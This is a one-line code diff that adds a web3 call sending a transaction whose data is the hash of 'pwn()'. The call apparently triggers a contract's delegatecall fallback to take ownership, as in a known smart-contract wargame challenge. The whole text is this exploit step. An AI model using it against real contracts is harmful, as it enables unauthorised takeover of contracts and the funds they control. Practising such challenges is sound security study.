@@ -1,0 +1,1 @@
+contract.sendTransaction({data: web3.sha3("pwn()")})
